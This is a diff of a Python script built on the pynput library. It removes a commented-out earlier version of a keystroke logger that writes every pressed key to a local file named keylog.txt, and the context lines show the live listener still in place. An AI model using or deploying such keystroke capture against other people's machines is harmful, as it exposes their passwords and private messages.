@@ -58,34 +58,3 @@ with keyboard.Listener(on_press=on_press) as listener:
         logging.exception("Error occurred: %s", str(e))
         on_exit()
 
-
-# from pynput import keyboard
-
-# # Global variables
-# log_file = "keylog.txt"
-# current_keys = []
-
-# # Function to write keys to the log file
-# def write_to_file(keys):
-#     with open(log_file, "a") as f:
-#         for key in keys:
-#             f.write(str(key))
-#         f.write("\n")
-
-# # Function called when a key is pressed
-# def on_press(key):
-#     try:
-#         # Convert the key to string format and append to the list
-#         current_keys.append(key.char)
-        
-#         # If the length of keys is greater than 10, write them to the log file
-#         if len(current_keys) >= 10:
-#             write_to_file(current_keys)
-#             current_keys.clear()
-#     except AttributeError:
-#         # Handle special keys like 'space', 'enter', etc.
-#         current_keys.append(str(key))
-
-# # Start the listener
-# with keyboard.Listener(on_press=on_press) as listener:
-#     listener.join()
